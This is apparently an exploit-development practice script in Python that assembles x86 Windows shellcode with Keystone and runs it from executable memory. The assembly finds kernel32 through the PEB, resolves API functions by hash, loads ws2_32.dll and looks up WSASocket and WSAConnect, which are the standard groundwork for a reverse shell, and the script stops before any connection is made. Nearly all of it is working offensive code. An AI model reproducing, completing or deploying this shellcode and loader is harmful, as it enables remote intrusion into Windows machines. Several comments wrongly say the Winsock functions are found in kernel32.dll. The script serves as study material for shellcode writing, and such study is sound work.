import ctypes, struct
import keystone

### assembly code ###
CODE = (
        "start:                  " #
        "   int3                ;" # DEBUGGING PURPOSES: Interrupt exec to attach debugger
        "   jmp main            ;" # jump down to main function

        "find_module:            " # find module (kernel32.dll) from PEB LDR
        "   xor ecx, ecx        ;" # zero out ecx
        "   mov esi,fs:[ecx+30h];" # PEB address (0x30 into the TEB)
        "   mov esi,[esi+0Ch]   ;" # Ldr address from PEB (0xC into PEB)
        "   mov esi,[esi+1Ch]   ;" # InItOrder head node from Ldr (0x1C into PEB_LDR_DATA)
        "next_module:            " #
        "   mov ebx, [esi+8h]   ;" # module base address of the node
        "   mov edi, [esi+20h]  ;" # module name
        "   mov esi, [esi]      ;" # flink entry
        "   cmp [edi+12*2], cx  ;" # check for null byte at word 12 (byte 24) of module name 
                                   # (terminating word for KERNEL32.DLL in unicode)
        "   jne next_module     ;" # move on to next module if no match
        "   ret                 ;" #
        
        "find_func:              " #
        "   pushad              ;" # store registers
        "   mov eax, [ebx+0x3c] ;" # offset to PE Header start
        "   mov edi, [ebx+eax+0x78];" # offset (RVA) to EAT (Export Address Table)
        "   add edi, ebx        ;" # address (VMA) of EAT 
        "   mov ecx, [edi+0x18] ;" # NumberOfNames
        "   mov eax, [edi+0x20] ;" # AddressOfNames offset
        "   add eax, ebx        ;" # AddressOfNames start address
        "   mov [ebp-4], eax    ;" # save AddressOfNames to stack
        "find_func_loop:         " #
        "   jecxz find_func_done;" # if ECX 0, jump out of loop
        "   dec ecx             ;" # dec NumberOfNames counter
        "   mov eax, [ebp-4]    ;" # retrieve AddressOfNames start address
        "   mov esi, [eax+ecx*4];" # AddressOfNames[NumOfNames_counter] offset
        "   add esi, ebx        ;" # AddressOfNames[x] address
        "hash_prep:             ;" #
        "   xor eax, eax        ;" # zero out eax
        "   cdq                 ;" # zero out edx (convert dword to qword)
        "   cld                 ;" # clear direction flag, string parse direction
        "hash_loop:             ;" #
        "   lodsb               ;" # load next byte from esi into al
        "   test al, al         ;" # check for null terminator byte
        "   jz hash_compare     ;" # exit if null
        "   ror edx, 0x0d       ;" # rotate edx (working hash) 13 bits right
        "   add edx, eax        ;" # add string byte to hash
        "   jmp hash_loop       ;" # loop   
        "hash_compare:           " #
        "   cmp edx, [esp+0x24] ;" # compare computed hash to pushed hash
        "   jnz find_func_loop  ;" # if not equal, go to next func
        "find_func_base:         " # 
        "   mov edx, [edi+0x24] ;" # AddressOfNameOrdinals offset
        "   add edx, ebx        ;" # AddressOfNameOrdinals start address
        "   mov cx, [edx+2*ecx] ;" # ordinal = AddressOfNameOrdinals[NumOfNames_counter]
        "   mov edx, [edi+0x1c] ;" # AddressOfFunctions offset
        "   add edx, ebx        ;" # AddressOfFunctions start address
        "   mov eax, [edx+4*ecx];" # AddressOfFunctions[ordinal] = function offset
        "   add eax, ebx        ;" # function address 
        "   mov [esp+0x1c], eax ;" # mov function address into stored stack value of eax (for popad)
        "find_func_done:         "
        "   popad               ;" # restore registers
        "   ret                 ;" #

        "call_termproc:          " # 
        "   xor ecx, ecx        ;" # zero out ecx
        "   push ecx            ;" # uExitCode
        "   push 0xffffffff     ;" # hProcess
        "   call eax            ;" # call TerminateProcess
        "   ret                 ;" #

        "main:                  ;" # main at the bottom for upward calls (avoid null bytes)
        "   mov ebp, esp        ;" # move up the base pointer to imitate a function call
        "   add esp, 0xfffffdf0 ;" # move the stack pointer -0x210 to avoid stack clobbering
        "kernel32_modules:      ;" #
        "   call find_module    ;" # find kernel32.dll base address
        "   push 0xec0e4e8e     ;" # LoadLibraryA hash
        "   call find_func      ;" # find LoadLibraryA in kernel32.dll
        "   mov [ebp+0x10], eax ;" # save LoadLibraryA address to stack
        "   push 0x16b3fe72     ;" # CreateProcessA hash
        "   call find_func      ;" # find CreateProcessA in kernel32.dll
        "   mov [ebp+0x14], eax ;" # save CreateProcessA address to stack
        "   push 0x78b5b983     ;" # TerminateProcess hash
        "   call find_func      ;" # find TerminateProcess in kernel32.dll
        "   mov [ebp+0x18], eax ;" # save TerminateProcess address to stack
        "load_ws2:               " #
        "   xor eax, eax        ;" # zero out eax
        "   mov ax, 0x6c6c      ;" # "ll" into eax
        "   push eax            ;" # push "ll\0\0"
        "   push 0x642e3233     ;" # push "32.d"
        "   push 0x5f327377     ;" # push "ws2_"
        "   push esp            ;" # push pointer to "ws2_32.dll"
        "   call dword ptr [ebp+0x10];" # call LoadLibraryA with ws2_32.dll
        "   mov ebx, eax        ;" # move ws2_32.dll
        "ws2_modules:            " #
        "   push 0x3bfcedcb     ;" # WSAStartup hash
        "   call find_func      ;" # find WSAStartup in kernel32.dll
        "   mov [ebp+0x1c], eax ;" # save WSAStartup address to stack
        "   push 0xa13315be     ;" # WSASocket hash
        "   call find_func      ;" # find WSASocket in kernel32.dll
        "   mov [ebp+0x24], eax ;" # save WSASocket address to stack
        "   push 0xb32dba0c     ;" # WSAConnect hash
        "   call find_func      ;" # find WSAConnect in kernel32.dll
        "   mov [ebp+0x28], eax ;" # save WSAConnect address to stack
        

        )


### generate shellcode ###
# init engine in x86-32bit mode
ks = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)
sh = b""
for e in encoding:
    sh += struct.pack("B", e) # add each byte object from an unsigned char (B)
shellcode = bytearray(sh)


### makes the shellcode executable ###
# allocate mem page with PAGE_EXEC_READWRITE perms, returns a pointer
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))
# tbh not sure here, but makes a ctype compatible buffer space from the shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
# move the buffer into the memory page
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))


### executes the shellcode ###
print("Shellcode located at address %s" % hex(ptr))
choice = "x"
while choice != "":
    choice = input("...PRESS ENTER TO EXECUTE SHELLCODE...")
    if choice == "c":
        print(shellcode)

# creates the thread environment for the shellcode to run
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))

